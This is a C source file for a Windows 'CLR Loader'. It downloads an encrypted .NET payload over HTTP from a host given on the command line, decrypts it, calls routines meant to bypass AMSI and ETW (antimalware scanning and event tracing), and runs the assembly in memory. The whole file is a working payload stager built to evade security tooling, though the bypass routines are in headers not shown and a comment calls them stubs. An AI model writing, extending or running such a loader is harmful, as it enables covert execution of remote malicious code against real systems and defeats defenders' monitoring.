#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "network.h"
#include "crypto.h"
#include "bypass.h"
#include "clr.h"

// ============================================================
// CLR Loader v1
//
// Usage: loader.exe <host> <port> <path> <passphrase> [-- args...]
//
// Example:
//   loader.exe 192.168.1.10 8080 /payload.enc MyKey -- arg1 arg2
//
// Flow:
//   1. Fetch encrypted .NET assembly via HTTP
//   2. Decrypt AES-256-CBC (key = SHA-256 of passphrase)
//   3. Bypass AMSI + ETW (stubs in v1)
//   4. Load CLR, execute assembly's Main(string[])
//   5. Cleanup
// ============================================================

int main(int argc, char* argv[]) {
    // --- Parse arguments ---
    if (argc < 5) {
        printf("Usage: %s <host> <port> <path> <passphrase> [-- args...]\n", argv[0]);
        printf("Example: %s 10.0.0.5 8080 /payload.enc Secret123 -- /all\n", argv[0]);
        return 1;
    }

    char* host       = argv[1];
    int   port       = atoi(argv[2]);
    char* path       = argv[3];
    char* passphrase = argv[4];

    // Find assembly arguments (everything after "--")
    int   net_argc = 0;
    char** net_argv = NULL;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--") == 0 && i + 1 < argc) {
            net_argv = &argv[i + 1];
            net_argc = argc - (i + 1);
            break;
        }
    }

    // --- 1. Fetch encrypted payload ---
    printf("[*] Fetching payload from %s:%d%s\n", host, port, path);
    BYTE* enc_buf  = NULL;
    DWORD enc_size = 0;

    if (!fetch_payload(host, port, path, &enc_buf, &enc_size)) {
        printf("[-] Network fetch failed\n");
        return 1;
    }
    printf("[+] Received: %lu bytes\n", enc_size);

    // --- 2. Decrypt ---
    BYTE* assembly  = NULL;
    DWORD asm_size  = 0;

    if (!decrypt_payload(enc_buf, enc_size, passphrase, &assembly, &asm_size)) {
        printf("[-] Decryption failed\n");
        free(enc_buf);
        return 1;
    }
    printf("[+] Decrypted: %lu bytes\n", asm_size);

    // Wipe encrypted buffer
    SecureZeroMemory(enc_buf, enc_size);
    free(enc_buf);

    // Validate .NET PE (check MZ + PE signatures)
    if (asm_size < 64 || assembly[0] != 'M' || assembly[1] != 'Z') {
        printf("[-] Invalid PE header (bad passphrase?)\n");
        SecureZeroMemory(assembly, asm_size);
        free(assembly);
        return 1;
    }
    printf("[+] PE header valid\n");

    // --- 3. Bypass AMSI + ETW ---
    if (!bypass_amsi()) {
        printf("[-] AMSI bypass failed\n");
    } else {
        printf("[+] AMSI bypass OK\n");
    }

    if (!bypass_etw()) {
        printf("[-] ETW bypass failed\n");
    } else {
        printf("[+] ETW bypass OK\n");
    }

    // --- 4. CLR Load + Execute ---
    printf("[*] Loading CLR and executing assembly...\n");
    fflush(stdout);

    HRESULT hr = clr_execute(assembly, asm_size, net_argv, net_argc);

    if (FAILED(hr)) {
        printf("[-] CLR execution failed: 0x%08lX\n", hr);
    } else {
        printf("[+] Assembly executed successfully\n");
    }

    // --- 5. Cleanup ---
    SecureZeroMemory(assembly, asm_size);
    free(assembly);

    return FAILED(hr) ? 1 : 0;
}
